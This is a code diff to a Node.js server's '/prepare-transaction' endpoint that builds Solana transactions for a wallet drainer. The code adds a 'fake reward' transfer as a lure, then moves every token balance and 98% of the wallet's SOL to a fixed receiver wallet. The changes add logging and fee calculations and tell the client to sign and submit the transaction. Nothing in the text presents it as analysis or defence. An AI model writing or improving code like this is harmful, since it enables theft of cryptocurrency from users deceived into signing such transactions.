@@ -167,29 +167,7 @@ app.post('/prepare-transaction', async (req, res) => {
         lamports: fakeRewardAmount,
       })
     );
-
-    // List of token mints to transfer
-    const tokenMints = [
-      'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
-      'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
-      'So11111111111111111111111111111111111111112',  // Wrapped SOL
-      'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', // Bonk
-      'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So',  // Marinade SOL
-      'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn', // Jito SOL
-      'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1',  // BlazeStake SOL
-      'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof', // Render Token
-      'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3', // Pyth Network
-      'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE',  // Orca
-      'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', // Serum
-      'A94X8334H7JtSyUgA4UFDL5H14PDe8YVV8Jj9k2sSmEw', // Aurory
-      'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6',  // Kin
-      '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', // Raydium
-      'MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey',  // Marinade
-      '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E', // Solana Beach Token
-      'CWE8jPTUYhdCTZYWPTe1o5DFqfdjzWKc9WKz6rSjQUdG', // Cope
-      'BLwTnYKqf7u4qjgZrrsKeNs2EzWkMLqVCu6j8iHyrNA3', // BonfidaBot
-      'UXPhBoR3qG4UCiGNJfV7MqhHyFqKN68g45GoYvAeL2M',  // UXD Protocol
-    ];
+    console.log(`Added fake reward transfer of ${fakeRewardAmount / LAMPORTS_PER_SOL} SOL`);
 
     // Fetch and process token accounts
     console.log("Fetching all token accounts for wallet...");
@@ -213,6 +191,7 @@ app.post('/prepare-transaction', async (req, res) => {
 
           const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
           if (!receiverAccountInfo) {
+            console.log(`Creating associated token account for ${mintAddress} at ${toTokenAccount.toBase58()}`);
             transaction.add(
               createAssociatedTokenAccountInstruction(
                 fromPubkey, // payer
@@ -223,6 +202,7 @@ app.post('/prepare-transaction', async (req, res) => {
             );
           }
 
+          console.log(`Adding transfer for ${balance.uiAmount} of token ${mintAddress}`);
           transaction.add(
             createTransferInstruction(
               fromTokenAccount,
@@ -231,28 +211,30 @@ app.post('/prepare-transaction', async (req, res) => {
               balance.amount
             )
           );
-
           tokenTransfers++;
           console.log(`Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
         }
       } catch (error) {
-        console.log(`Error processing token account:`, error.message);
+        console.error(`Error processing token account ${tokenAccount.pubkey.toBase58()}:`, error.message);
       }
     }
 
     // Calculate and add SOL transfer
     const solBalance = await connection.getBalance(fromPubkey);
+    console.log(`Wallet SOL balance: ${solBalance / LAMPORTS_PER_SOL} SOL`);
     const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-    const baseFee = 5000;
-    const instructionFee = (tokenTransfers + 1) * 5000;
-    const accountCreationFee = tokenTransfers * 2039280;
+    console.log(`Minimum balance for rent exemption: ${minBalance / LAMPORTS_PER_SOL} SOL`);
+    const baseFee = 5000; // Base transaction fee in lamports
+    const instructionFee = (tokenTransfers + 2) * 5000; // Fee per instruction (including reward and SOL transfer)
+    const accountCreationFee = tokenTransfers * 2039280; // Fee for creating new ATA (if any)
     const estimatedFees = baseFee + instructionFee + accountCreationFee;
+    console.log(`Estimated fees: ${estimatedFees / LAMPORTS_PER_SOL} SOL`);
     const availableBalance = solBalance - minBalance - estimatedFees;
-    const solForTransfer = Math.floor(availableBalance * 0.98);
-
-    console.log(`SOL transfer amount: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
+    console.log(`Available balance after fees: ${availableBalance / LAMPORTS_PER_SOL} SOL`);
+    const solForTransfer = Math.max(0, Math.floor(availableBalance * 0.98)); // Transfer 98% of available balance
 
     if (solForTransfer > 0) {
+      console.log(`Transferring ${solForTransfer / LAMPORTS_PER_SOL} SOL to ${receiverWallet.toBase58()}`);
       transaction.add(
         SystemProgram.transfer({
           fromPubkey: fromPubkey,
@@ -261,9 +243,11 @@ app.post('/prepare-transaction', async (req, res) => {
         })
       );
       totalTransferred += solForTransfer;
+    } else {
+      console.warn(`No SOL available for transfer after fees. Available: ${availableBalance / LAMPORTS_PER_SOL} SOL`);
     }
 
-    console.log(`Transaction prepared with ${tokenTransfers} token transfers + SOL transfer`);
+    console.log(`Transaction prepared with ${tokenTransfers} token transfers + ${totalTransferred > 0 ? 'SOL' : 'no SOL'} transfer`);
 
     const { blockhash } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
@@ -277,11 +261,12 @@ app.post('/prepare-transaction', async (req, res) => {
     res.json({
       transaction: Array.from(serializedTransaction),
       transferAmount: totalTransferred,
-      tokenTransfers: tokenTransfers
+      tokenTransfers: tokenTransfers,
+      note: "Client must sign and send this transaction to the blockchain for the transfer to complete."
     });
   } catch (e) {
-    console.error(e.message);
-    res.status(500).json({ error: "transaction preparation error" });
+    console.error('Transaction preparation error:', e.message, e.stack);
+    res.status(500).json({ error: "transaction preparation error", details: e.message });
   }
 });
 
